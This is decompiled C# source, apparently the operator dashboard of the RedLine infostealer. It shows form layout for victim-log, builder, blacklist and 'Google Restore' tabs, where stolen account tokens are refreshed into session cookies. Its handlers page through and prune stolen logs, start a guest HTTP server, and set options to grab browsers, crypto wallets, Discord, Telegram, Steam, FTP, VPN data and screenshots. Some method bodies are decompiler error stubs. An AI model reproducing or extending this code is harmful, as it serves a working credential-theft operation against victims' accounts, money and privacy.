		((MetroSetButton)this.telegramLinkBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.telegramLinkBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.telegramLinkBtn).Location = new System.Drawing.Point(494, 266);
		((System.Windows.Forms.Control)this.telegramLinkBtn).Name = "telegramLinkBtn";
		((MetroSetButton)this.telegramLinkBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.telegramLinkBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.telegramLinkBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.telegramLinkBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.telegramLinkBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.telegramLinkBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.telegramLinkBtn).Size = new System.Drawing.Size(70, 23);
		((MetroSetButton)this.telegramLinkBtn).Style = (Style)0;
		((MetroSetButton)this.telegramLinkBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.telegramLinkBtn).TabIndex = 32;
		((System.Windows.Forms.Control)this.telegramLinkBtn).Text = "Open";
		((MetroSetButton)this.telegramLinkBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.telegramLinkBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.telegramLinkBtn).Click += new System.EventHandler(telegramLinkBtn_Click);
		((System.Windows.Forms.BindingSource)this.d2).DataSource = typeof(RedLine.SharedModels.UserLog);
		((System.Windows.Forms.BindingSource)this.object_13).DataSource = typeof(RedLine.SharedModels.GuestFile);
		((System.Windows.Forms.BindingSource)this.object_10).DataSource = typeof(RedLine.SharedModels.UserLog);
		((System.Windows.Forms.BindingSource)this.d1).DataSource = typeof(RedLine.SharedModels.UserLog);
		((System.Windows.Forms.Control)this.restoreTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.restoreTab).Controls.Add((System.Windows.Forms.Control)this.label29);
		((System.Windows.Forms.Control)this.restoreTab).Controls.Add((System.Windows.Forms.Control)this.freshCookiesTb);
		((System.Windows.Forms.Control)this.restoreTab).Controls.Add((System.Windows.Forms.Control)this.refreshCookiesBtn);
		((System.Windows.Forms.Control)this.restoreTab).Controls.Add((System.Windows.Forms.Control)this.accessTokenTb);
		((System.Windows.Forms.Control)this.restoreTab).Controls.Add((System.Windows.Forms.Control)this.refreshCookiesLbl);
		((System.Windows.Forms.Control)this.restoreTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.restoreTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.restoreTab).Name = "restoreTab";
		((System.Windows.Forms.Control)this.restoreTab).Padding = new System.Windows.Forms.Padding(3);
		((System.Windows.Forms.Control)this.restoreTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.restoreTab).TabIndex = 20;
		((System.Windows.Forms.Control)this.restoreTab).Text = "Google Restore";
		((System.Windows.Forms.Control)this.label29).AutoSize = true;
		((System.Windows.Forms.Control)this.label29).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label29).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label29).Location = new System.Drawing.Point(11, 6);
		((System.Windows.Forms.Control)this.label29).Name = "label29";
		((System.Windows.Forms.Control)this.label29).Size = new System.Drawing.Size(127, 15);
		((System.Windows.Forms.Control)this.label29).TabIndex = 124;
		((System.Windows.Forms.Control)this.label29).Text = "Fresh account cookies:";
		((AnimaTextBox)this.freshCookiesTb).Dark = false;
		((System.Windows.Forms.Control)this.freshCookiesTb).Location = new System.Drawing.Point(14, 24);
		((AnimaTextBox)this.freshCookiesTb).MaxLength = 32767;
		((AnimaTextBox)this.freshCookiesTb).MultiLine = true;
		((System.Windows.Forms.Control)this.freshCookiesTb).Name = "freshCookiesTb";
		((AnimaTextBox)this.freshCookiesTb).Numeric = false;
		((AnimaTextBox)this.freshCookiesTb).ReadOnly = true;
		((System.Windows.Forms.Control)this.freshCookiesTb).Size = new System.Drawing.Size(1143, 565);
		((System.Windows.Forms.Control)this.freshCookiesTb).TabIndex = 123;
		((AnimaTextBox)this.freshCookiesTb).UseSystemPasswordChar = false;
		((MetroSetButton)this.refreshCookiesBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.refreshCookiesBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.refreshCookiesBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.refreshCookiesBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.refreshCookiesBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.refreshCookiesBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.refreshCookiesBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.refreshCookiesBtn).Location = new System.Drawing.Point(1026, 610);
		((System.Windows.Forms.Control)this.refreshCookiesBtn).Name = "refreshCookiesBtn";
		((MetroSetButton)this.refreshCookiesBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.refreshCookiesBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.refreshCookiesBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.refreshCookiesBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.refreshCookiesBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.refreshCookiesBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.refreshCookiesBtn).Size = new System.Drawing.Size(131, 23);
		((MetroSetButton)this.refreshCookiesBtn).Style = (Style)0;
		((MetroSetButton)this.refreshCookiesBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.refreshCookiesBtn).TabIndex = 122;
		((System.Windows.Forms.Control)this.refreshCookiesBtn).Text = "Refresh";
		((MetroSetButton)this.refreshCookiesBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.refreshCookiesBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.refreshCookiesBtn).Click += new System.EventHandler(refreshCookiesBtn_Click);
		((AnimaTextBox)this.accessTokenTb).Dark = false;
		((System.Windows.Forms.Control)this.accessTokenTb).Location = new System.Drawing.Point(14, 610);
		((AnimaTextBox)this.accessTokenTb).MaxLength = 32767;
		((AnimaTextBox)this.accessTokenTb).MultiLine = false;
		((System.Windows.Forms.Control)this.accessTokenTb).Name = "accessTokenTb";
		((AnimaTextBox)this.accessTokenTb).Numeric = false;
		((AnimaTextBox)this.accessTokenTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.accessTokenTb).Size = new System.Drawing.Size(1006, 23);
		((System.Windows.Forms.Control)this.accessTokenTb).TabIndex = 121;
		((AnimaTextBox)this.accessTokenTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.refreshCookiesLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.refreshCookiesLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.refreshCookiesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.refreshCookiesLbl).Location = new System.Drawing.Point(11, 592);
		((System.Windows.Forms.Control)this.refreshCookiesLbl).Name = "refreshCookiesLbl";
		((System.Windows.Forms.Control)this.refreshCookiesLbl).Size = new System.Drawing.Size(127, 15);
		((System.Windows.Forms.Control)this.refreshCookiesLbl).TabIndex = 120;
		((System.Windows.Forms.Control)this.refreshCookiesLbl).Text = "Google account token:";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(1366, 674);
		base.Controls.Add((System.Windows.Forms.Control)this.dashboardTabs);
		base.Controls.Add((System.Windows.Forms.Control)this.topHeader);
		base.Controls.Add((System.Windows.Forms.Control)this.panel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "MainFrm";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Dashboard";
		((System.Windows.Forms.Control)this.logContextMenu).ResumeLayout(false);
		((System.Windows.Forms.Control)this.e0).ResumeLayout(false);
		((System.Windows.Forms.Control)this.d8).ResumeLayout(false);
		((System.Windows.Forms.Control)this.blackListCms_2).ResumeLayout(false);
		((System.Windows.Forms.Control)this.blackListCms_3).ResumeLayout(false);
		((System.Windows.Forms.Control)this.topHeader).ResumeLayout(false);
		((System.Windows.Forms.Control)this.topHeader).PerformLayout();
		((System.Windows.Forms.Control)this.blackListCms_4).ResumeLayout(false);
		((System.Windows.Forms.Control)this.blackListCms_5).ResumeLayout(false);
		((System.Windows.Forms.Control)this.trayCms).ResumeLayout(false);
		((System.Windows.Forms.Control)this.blackListCms_6).ResumeLayout(false);
		((System.Windows.Forms.Control)this.blackListCms_7).ResumeLayout(false);
		((System.Windows.Forms.Control)this.dashboardTabs).ResumeLayout(false);
		((System.Windows.Forms.Control)this.logsTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.logsTab).PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.logsListView).EndInit();
		((System.ComponentModel.ISupportInitialize)this.object_17).EndInit();
		((System.Windows.Forms.Control)this.statisticTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.statisticTab).PerformLayout();
		((System.Windows.Forms.Control)this.partnersTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.fc).ResumeLayout(false);
		((System.Windows.Forms.Control)this.fc).PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.guestFilesDgv).EndInit();
		((System.ComponentModel.ISupportInitialize)this.object_14).EndInit();
		((System.ComponentModel.ISupportInitialize)this.fd).EndInit();
		((System.ComponentModel.ISupportInitialize)this.object_12).EndInit();
		((System.Windows.Forms.Control)this.tasksTab).ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.tasksDgv).EndInit();
		((System.ComponentModel.ISupportInitialize)this.object_11).EndInit();
		((System.Windows.Forms.Control)this.sorterTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.sorterTab).PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.cookiesMoreThan).EndInit();
		((System.ComponentModel.ISupportInitialize)this.passMoreThan).EndInit();
		((System.Windows.Forms.Control)this.dd).ResumeLayout(false);
		((System.Windows.Forms.Control)this.dd).PerformLayout();
		((System.Windows.Forms.Control)this.builderTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.builderTab).PerformLayout();
		((System.Windows.Forms.Control)this.m_ac).ResumeLayout(false);
		((System.Windows.Forms.Control)this.m_ac).PerformLayout();
		((System.Windows.Forms.Control)this.f2).ResumeLayout(false);
		((System.Windows.Forms.Control)this.f2).PerformLayout();
		((System.Windows.Forms.Control)this.notificationTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.blackListsTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.blackListsTab).PerformLayout();
		((System.Windows.Forms.Control)this.settingsTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.settingsTab).PerformLayout();
		((System.Windows.Forms.Control)this.contactsTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.contactsTab).PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.e5).EndInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.d2).EndInit();
		((System.ComponentModel.ISupportInitialize)this.object_13).EndInit();
		((System.ComponentModel.ISupportInitialize)this.object_10).EndInit();
		((System.ComponentModel.ISupportInitialize)this.d1).EndInit();
		((System.Windows.Forms.Control)this.restoreTab).ResumeLayout(false);
		((System.Windows.Forms.Control)this.restoreTab).PerformLayout();
		base.ResumeLayout(false);
	}

	[CompilerGenerated]
	private void method_7(uint page)
	{
		int page = (int)page;
		if (page >= 0 && page < LazyLoader<UserLogsDb>.Instance.PageController.PagesCount)
		{
			Invoke((MethodInvoker)delegate
			{
				((Control)currentPage).Text = (page + 1).ToString();
				((DataGridView)logsListView).DataSource = LazyLoader<UserLogsDb>.Instance.PageController.Pages[page];
			});
		}
	}

	[CompilerGenerated]
	private void method_8(object _, object __)
	{
		ProcessNotifies();
	}

	[CompilerGenerated]
	private void method_9(object _, object __)
	{
		lock (RedlineEvents.Counter)
		{
			((Control)activeConnections).Text = RedlineEvents.Counter.ToString();
			RedlineEvents.Counter = 0;
		}
	}

	[CompilerGenerated]
	private void method_10(uint count)
	{
		int count = (int)count;
		try
		{
			if (count < LazyLoader<UserLogsDb>.Instance.PageController.PageSize)
			{
				LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = 1;
			}
			else
			{
				LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = count / LazyLoader<UserLogsDb>.Instance.PageController.PageSize + 1;
			}
			lock (object_1)
			{
				if (!base.InvokeRequired)
				{
					((Control)totalLogs).Text = count.ToString();
					((Control)totalPages).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
					return;
				}
				Invoke((MethodInvoker)delegate
				{
					((Control)totalLogs).Text = count.ToString();
					((Control)totalPages).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
				});
			}
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private void method_11()
	{
		try
		{
			GuestHttpServer guestHttpServer = new GuestHttpServer(20);
			AddNotify("GuestHttpServer is starting");
			guestHttpServer.ProcessRequest += method_2;
			guestHttpServer.Start("+", ((ServiceSettings)object_3).GuestPort);
			AddNotify("GuestHttpServer is running");
		}
		catch (Exception arg)
		{
			AddNotify($"GuestHttpServer error: {arg}");
		}
	}

	[CompilerGenerated]
	private object method_12()
	{
		/*Error: Method body consists only of 'ret', but nothing is being returned. Decompiled assembly might be a reference assembly.*/;
	}

	[CompilerGenerated]
	private object method_13()
	{
		/*Error: Method body consists only of 'ret', but nothing is being returned. Decompiled assembly might be a reference assembly.*/;
	}

	[CompilerGenerated]
	private object method_14()
	{
		while (true)
		{
			try
			{
				lock (a)
				{
					((StatisticDb)object_8).SaveSettings();
				}
			}
			catch (Exception)
			{
			}
			Task.Delay(TimeSpan.FromSeconds(30.0)).Wait();
		}
	}

	[CompilerGenerated]
	private void method_15()
	{
		((MetroSetCheckBox)discordCb).Checked = RemoteClientSettings.GrabDiscord;
		((MetroSetCheckBox)c9).Checked = RemoteClientSettings.GrabWallets;
		((MetroSetCheckBox)grabBrowsersCb).Checked = RemoteClientSettings.GrabBrowsers;
		((MetroSetCheckBox)grabFilesCb).Checked = RemoteClientSettings.GrabFiles;
		((MetroSetCheckBox)grabFtpsCb).Checked = RemoteClientSettings.GrabFTP;
		((MetroSetCheckBox)grabImClientsCb).Checked = RemoteClientSettings.GrabImClients;
		((MetroSetCheckBox)duplicateCb).Checked = RemoteClientSettings.AntiDuplicate;
		((MetroSetCheckBox)d0).Checked = RemoteClientSettings.BlockEmptyLogs;
		((MetroSetCheckBox)e3).Checked = RemoteClientSettings.SaveAsJSON;
		((MetroSetCheckBox)vpnCb).Checked = RemoteClientSettings.GrabVPN;
		((MetroSetCheckBox)screenshotCb).Checked = RemoteClientSettings.GrabScreenshot;
		((MetroSetCheckBox)telegramCb).Checked = RemoteClientSettings.GrabTelegram;
		((MetroSetCheckBox)steamCb).Checked = RemoteClientSettings.GrabSteam;
		((AnimaTextBox)autosaveDirTb).Text = RemoteClientSettings.AutosaveDirectory;
		((AnimaTextBox)f6).Text = RemoteClientSettings.TelegramBotToken;
		((MetroSetCheckBox)autoStartTelegramCb).Checked = RemoteClientSettings.AutoStart;
		foreach (string dDPattern in RemoteClientSettings.DDPatterns)
		{
			((ListBox)domainDetectorLb).Items.Add(dDPattern);
		}
		foreach (string blackListedBuild in RemoteClientSettings.BlackListedBuilds)
		{
			((ListBox)blackListBuildsLb).Items.Add(blackListedBuild);
		}
		foreach (string item in RemoteClientSettings.BlacklistedHWID)
		{
			((ListBox)blackListHWIDsLb).Items.Add(item);
		}
		foreach (string blackListedIP in RemoteClientSettings.BlackListedIPS)
		{
			((ListBox)blackListIPsLb).Items.Add(blackListedIP);
		}
		foreach (string item2 in RemoteClientSettings.BlacklistedCountry)
		{
			((ListBox)blackListLb).Items.Add(item2);
		}
		foreach (string grabPath in RemoteClientSettings.GrabPaths)
		{
			((ListBox)getFilesSettingsLb).Items.Add(grabPath);
		}
	}

	[CompilerGenerated]
	private void method_16()
	{
		try
		{
			lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
			{
				lock (a)
				{
					((StatisticDb)object_8).SetDefault();
					((StatisticDb)object_8).SaveSettings();
				}
				UpdateStat();
				Invoke((MethodInvoker)delegate
				{
					LazyLoader<UserLogsDb>.Instance.ClearDb();
				});
				LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
			}
			AddNotify("A List of logs cleared");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	[CompilerGenerated]
	private void method_17()
	{
		lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
		{
			Invoke((MethodInvoker)delegate
			{
				UpdateTasks();
			});
		}
	}

	[CompilerGenerated]
	private void method_18()
	{
		UpdateTasks();
	}

	[CompilerGenerated]
	private void method_19()
	{
		LazyLoader<TasksDb>.Instance.ClearDb();
		lock (c)
		{
			CompletedTasks.Default.Completed = new StringCollection();
			CompletedTasks.Default.Save();
		}
		lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
		{
			Invoke((MethodInvoker)delegate
			{
				UpdateTasks();
			});
		}
	}

	[CompilerGenerated]
	private void method_20()
	{
		UpdateTasks();
	}

	[CompilerGenerated]
	private void method_21(uint index, uint total)
	{
		int index = (int)index;
		int total = (int)total;
		Invoke((MethodInvoker)delegate
		{
			((Control)this.m_a0).Text = $"{index} / {total}";
		});
	}

	[CompilerGenerated]
	private void method_22()
	{
		((Control)this.m_a0).Text = "Waiting";
		((Control)this.m_a2).Text = "None";
	}

	[CompilerGenerated]
	private void method_23()
	{
		try
		{
			OpenFileDialog ofd = new OpenFileDialog();
			try
			{
				ofd.Filter = "Ico files (*.ico)|*.ico";
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.RestoreDirectory = true;
				ofd.Multiselect = false;
				Invoke((MethodInvoker)delegate
				{
					if (ofd.ShowDialog(this) == DialogResult.OK)
					{
						((AnimaTextBox)this.m_aa).Text = ofd.FileName;
					}
				});
			}
			finally
			{
				if (ofd != null)
				{
					((IDisposable)ofd).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	[CompilerGenerated]
	private void method_24()
	{
		UserLog[] array = new UserLog[0];
		lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
		{
			array = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
		}
		UserLog[] array2 = array;
		for (int i = 0; i < array2.Length; i++)
		{
			UserLog item = array2[i];
			if (item.IsMatch((string)object_6))
			{
				((Collection<UserLog>)object_5).Add(item);
			}
		}
	}

	[CompilerGenerated]
	private void method_25()
	{
		((DataGridView)logsListView).DataSource = object_5;
	}

	[CompilerGenerated]
	private void a0()
	{
		try
		{
			lock (a)
			{
				((StatisticDb)object_8).SetDefault();
				((StatisticDb)object_8).SaveSettings();
			}
			UpdateStat();
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	[CompilerGenerated]
	private void a1()
	{
		try
		{
			OpenFileDialog ofd = new OpenFileDialog();
			try
			{
				ofd.Filter = "Txt files (*.txt)|*.txt";
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.RestoreDirectory = true;
				ofd.Multiselect = false;
				Invoke((MethodInvoker)delegate
				{
					if (ofd.ShowDialog(this) == DialogResult.OK)
					{
						string[] array = System.IO.File.ReadAllLines(ofd.FileName);
						foreach (string item in array)
						{
							((ListBox)getFilesSettingsLb).Items.Add(item);
						}
					}
				});
			}
			finally
			{
				if (ofd != null)
				{
					((IDisposable)ofd).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	[CompilerGenerated]
	private void a2()
	{
		try
		{
			OpenFileDialog ofd = new OpenFileDialog();
			try
			{
				ofd.Filter = "Txt files (*.txt)|*.txt";
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.RestoreDirectory = true;
				ofd.Multiselect = false;
				Invoke((MethodInvoker)delegate
				{
					if (ofd.ShowDialog(this) == DialogResult.OK)
					{
						string[] array = System.IO.File.ReadAllLines(ofd.FileName);
						foreach (string item in array)
						{
							((ListBox)domainDetectorLb).Items.Add(item);
						}
					}
				});
			}
			finally
			{
				if (ofd != null)
				{
					((IDisposable)ofd).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	[CompilerGenerated]
	private void a3()
	{
		try
		{
			OpenFileDialog ofd = new OpenFileDialog();
			try
			{
				ofd.Filter = "Txt files (*.txt)|*.txt";
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.RestoreDirectory = true;
				ofd.Multiselect = false;
				Invoke((MethodInvoker)delegate
				{
					if (ofd.ShowDialog(this) == DialogResult.OK)
					{
						string[] array = System.IO.File.ReadAllLines(ofd.FileName);
						foreach (string item in array)
						{
							((ListBox)blackListIPsLb).Items.Add(item);
						}
					}
				});
			}
			finally
			{
				if (ofd != null)
				{
					((IDisposable)ofd).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	[CompilerGenerated]
	private void a4(uint index, uint total)
	{
		int index = (int)index;
		int total = (int)total;
		Invoke((MethodInvoker)delegate
		{
			((Control)ef).Text = $"{index} / {total}";
		});
	}

	[CompilerGenerated]
	private void a5()
	{
		((Control)ef).Text = "Waiting";
		((Control)eb).Text = "None";
	}

	[CompilerGenerated]
	private void a6()
	{
		((ListBox)recipientsIdsListBox).Items.Clear();
		lock (((TelegramChatsDb)this.m_e).RootLocker)
		{
			string[] chatIds = ((TelegramChatsDb)this.m_e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString())?.ToArray();
			Invoke((MethodInvoker)delegate
			{
				ListBox.ObjectCollection items = ((ListBox)recipientsIdsListBox).Items;
				object[] items2 = chatIds ?? new string[0];
				items.AddRange(items2);
			});
		}
	}

	[CompilerGenerated]
	private uint a7(GuestLink x)
	{
		return (x.BuildID == ((AnimaTextBox)guestBuildID).Text) ? 1u : 0u;
	}

	[CompilerGenerated]
	private void a8()
	{
		try
		{
			LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
			LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
			UserLog[] source;
			lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
			{
				source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
			}
			BindingList<UserLog> bindingList = new BindingList<UserLog> { source.Where((UserLog x) => x.Creds == "0|0|0|0") };
			foreach (UserLog newLog in bindingList)
			{
				LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
			}
			LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
			LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
			LazyLoader<UserLogsDb>.Instance.PageController.Clear();
			LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
			LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
			MessageBox.Show(this, $"Removed {bindingList.Count} empty logs");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	[CompilerGenerated]
	private void a9()
	{
		try
		{
			LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
			LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
			UserLog[] source;
			lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
			{
				source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
			}
			BindingList<UserLog> bindingList = new BindingList<UserLog> { source.Where((UserLog x) => x.Checked) };
			foreach (UserLog newLog in bindingList)
			{
				LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
			}
			LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
			LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
			LazyLoader<UserLogsDb>.Instance.PageController.Clear();
			LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
			LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
			MessageBox.Show(this, $"Removed {bindingList.Count} checked logs");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	[CompilerGenerated]
	private void aa()
	{
		try
		{
			OpenFileDialog ofd = new OpenFileDialog();
			try
			{
				ofd.Filter = "Txt files (*.txt)|*.txt";
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.RestoreDirectory = true;
				ofd.Multiselect = false;
				Invoke((MethodInvoker)delegate
				{
					if (ofd.ShowDialog(this) == DialogResult.OK)
					{
						string[] array = System.IO.File.ReadAllLines(ofd.FileName);
						foreach (string item in array)
						{
							((ListBox)blackListHWIDsLb).Items.Add(item);
						}
					}
				});
			}
			finally
			{
				if (ofd != null)
				{
					((IDisposable)ofd).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	[CompilerGenerated]
	private void ab()
	{
		object obj = virusTotalTextbox;
		((AnimaTextBox)obj).Text = ((AnimaTextBox)obj).Text + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + " | Stopped" + Environment.NewLine;
		((MetroSetButton)metroSetButton3).Enabled = true;
		((Control)metroSetButton3).Text = "Start";
	}

	[CompilerGenerated]
	private void ac()
	{
	}

	[CompilerGenerated]
	private void ad()
	{
		try
		{
			OpenFileDialog ofd = new OpenFileDialog();
			try
			{
				ofd.Filter = "Txt files (*.txt)|*.txt";
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.RestoreDirectory = true;
				ofd.Multiselect = false;
				Invoke((MethodInvoker)delegate
				{
					if (ofd.ShowDialog(this) == DialogResult.OK)
					{
						string[] array = System.IO.File.ReadAllLines(ofd.FileName);
						foreach (string item in array)
						{
							((ListBox)blackListLb).Items.Add(item);
						}
					}
				});
			}
			finally
			{
				if (ofd != null)
				{
					((IDisposable)ofd).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	[CompilerGenerated]
	private void ae()
	{
		try
		{
			OpenFileDialog ofd = new OpenFileDialog();
			try
			{
				ofd.Filter = "Txt files (*.txt)|*.txt";
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.RestoreDirectory = true;
				ofd.Multiselect = false;
				Invoke((MethodInvoker)delegate
				{
					if (ofd.ShowDialog(this) == DialogResult.OK)
					{
						string[] array = System.IO.File.ReadAllLines(ofd.FileName);
						foreach (string item in array)
						{
							((ListBox)blackListBuildsLb).Items.Add(item);
						}
					}
				});
			}
			finally
			{
				if (ofd != null)
				{
					((IDisposable)ofd).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}
}
